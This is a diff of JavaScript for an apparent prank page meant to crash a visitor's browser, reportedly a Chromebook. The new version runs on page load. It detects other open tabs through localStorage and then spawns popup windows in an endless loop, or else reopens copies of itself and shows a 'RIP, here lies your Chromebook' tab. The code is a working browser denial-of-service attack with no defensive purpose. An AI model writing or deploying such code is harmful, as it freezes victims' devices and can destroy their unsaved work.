@@ -1,24 +1,26 @@
-localStorage.openpages = Date.now();
+  localStorage.openpages = Date.now();
 
-var anotherPageOpen = false;
+  var anotherPageOpen = false;
 
-var onLocalStorageEvent = function(e){
-  if (e.key == "openpages") {
-    // Emit that you're already available.
-    localStorage.page_available = Date.now();
-  }
-  if (e.key == "page_available") {
-    // Another page is open
-    anotherPageOpen = true;
-  }
-};
+  var onLocalStorageEvent = function(e){
+    if (e.key == "openpages") {
+      // Emit that you're already available.
+      localStorage.page_available = Date.now();
+    }
+    if (e.key == "page_available") {
+      // Another page is open
+      anotherPageOpen = true;
+    }
+  };
 
-// Check if another page is open after a short delay
-var openCheck = setTimeout(function(){
-  if (anotherPageOpen) {
-      function openWindow() {
-        const newWin = window.open('', "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=200, height=180, titlebar=no, alwaysRaised=yes');
-        if (newWin) {
+  window.addEventListener('storage', onLocalStorageEvent, false);
+
+  function checkOpenPages() {
+    setTimeout(function() {
+      if (anotherPageOpen) {
+        function openWindow() {
+          const newWin = window.open('', "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=200, height=180, titlebar=no, alwaysRaised=yes');
+          if (newWin) {
             const screenWidth = screen.width - 200; // Keep within bounds
             const screenHeight = screen.height - 180;
 
@@ -28,33 +30,34 @@ var openCheck = setTimeout(function(){
             newWin.moveTo(randomX, randomY);
 
             return newWin;
+          }
         }
-    }
-    while (true) openWindow();
-  } else {
-      // Open 4 small windows at the bottom of the screen
-            for (let i = 0; i < 4; i++) {
-                let newWin = window.open(window.location.href, '_blank', 'width=100,height=100,resizable=no,scrollbars=no');
-                newWin.moveTo(screen.width, screen.height);
-            }
+        while (true) openWindow();
+      } else {
+        // Open 4 small windows at the bottom of the screen
+        for (let i = 0; i < 5; i++) {
+          let newWin = window.open(window.location.href, '_blank', 'width=100,height=100,resizable=no,scrollbars=no');
+          newWin.moveTo(screen.width, screen.height);
+        }
 
-            // Open a new tab with custom HTML content
-            let newWindow = window.open('about:blank', '_blank');
-            newWindow.document.write(`
-                <!DOCTYPE html>
-                <html lang="en">
-                <head>
-                    <meta charset="UTF-8">
-                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                    <title>RIP</title>
-                </head>
-                <body>
-                    <h1>I'm sorry for your Chromebook</h1>
-                    <p>Here lies your Chromebook, 2024 - 2025</p>
-                </body>
-                </html>
-            `);
+        // Open a new tab with custom HTML content
+        let newWindow = window.open('about:blank', '_blank');
+        newWindow.document.write(`
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>RIP</title>
+          </head>
+          <body>
+            <h1>I'm sorry for your Chromebook</h1>
+            <p>Here lies your Chromebook, 2024 - 2025</p>
+          </body>
+          </html>
+        `);
+      }
+    }, 100);
   }
-}, 100);
 
-window.addEventListener('storage', onLocalStorageEvent, false)
+  window.onload = checkOpenPages;
